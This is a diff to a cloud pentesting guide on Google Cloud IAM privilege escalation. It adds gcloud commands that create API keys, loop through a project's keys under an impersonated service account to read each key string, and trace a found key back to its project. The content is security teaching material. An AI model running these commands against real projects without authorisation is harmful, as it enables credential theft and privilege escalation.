@@ -231,8 +231,6 @@ The following screenshot shows how you would create an API key in the web consol
 
 With the undocumented API that was discovered, we can also create API keys through the API itself.
 
-![](https://rhinosecuritylabs.com/wp-content/uploads/2020/04/image3-1.png)
-
 The screenshot above shows a POST request being sent to retrieve a new API key for the project.
 
 The exploit script for this method can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/serviceusage.apiKeys.create.py).
@@ -246,6 +244,55 @@ Another undocumented API was found for listing API keys that have already been c
 The screenshot above shows that the request is exactly the same as before, it just is a GET request instead of a POST request. This only shows a single key, but if there were additional keys in the project, those would be listed too.
 
 The exploit script for this method can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/serviceusage.apiKeys.list.py).
+
+## apikeys
+
+### apikeys.keys.create <a href="#apikeys.keys.create" id="apikeys.keys.create"></a>
+
+This permission allows to **create an API key**:
+
+```bash
+gcloud alpha services api-keys create
+Operation [operations/akmf.p7-[...]9] complete. Result: {
+    "@type":"type.googleapis.com/google.api.apikeys.v2.Key",
+    "createTime":"2022-01-26T12:23:06.281029Z",
+    "etag":"W/\"HOhA[...]==\"",
+    "keyString":"AIzaSy[...]oU",
+    "name":"projects/5[...]6/locations/global/keys/f707[...]e8",
+    "uid":"f707[...]e8",
+    "updateTime":"2022-01-26T12:23:06.378442Z"
+}
+```
+
+You can find a script to automate the [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/b-apikeys.keys.create.sh).
+
+### apikeys.keys.getKeyString,apikeys.keys.list <a href="#apikeys.keys.getkeystringapikeys.keys.list" id="apikeys.keys.getkeystringapikeys.keys.list"></a>
+
+These permissions allows **list and get all the apiKeys and get the Key**:
+
+```bash
+gcloud alpha services api-keys create
+for  key  in  $(gcloud --impersonate-service-account="${SERVICE_ACCOUNT_ID}@${PROJECT_ID}.iam.gserviceaccount.com" alpha services api-keys list --uri); do
+	gcloud --impersonate-service-account="${SERVICE_ACCOUNT_ID}@${PROJECT_ID}.iam.gserviceaccount.com" alpha services api-keys get-key-string "$key"
+done
+```
+
+You can find a script to automate the [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/c-apikeys.keys.getKeyString.sh).
+
+### apikeys.keys.regenerate,apikeys.keys.list <a href="#serviceusage.apikeys.regenerateapikeys.keys.list" id="serviceusage.apikeys.regenerateapikeys.keys.list"></a>
+
+These permissions will (potentially) allow you to **list and regenerate all the apiKeys getting the new Key**.\
+It’s not possible to use this from `gcloud` but you probably can use it via the API. Once it’s supported, the exploitation will be similar to the previous one (I guess).
+
+### apikeys.keys.lookup <a href="#apikeys.keys.lookup" id="apikeys.keys.lookup"></a>
+
+This is extremely useful to check to **which GCP project an API key that you have found belongs to**:
+
+```bash
+gcloud alpha services api-keys lookup AIzaSyD[...]uE8Y
+name: projects/5[...]6/locations/global/keys/28d[...]e0e
+parent: projects/5[...]6/locations/global
+```
 
 ## storage
 
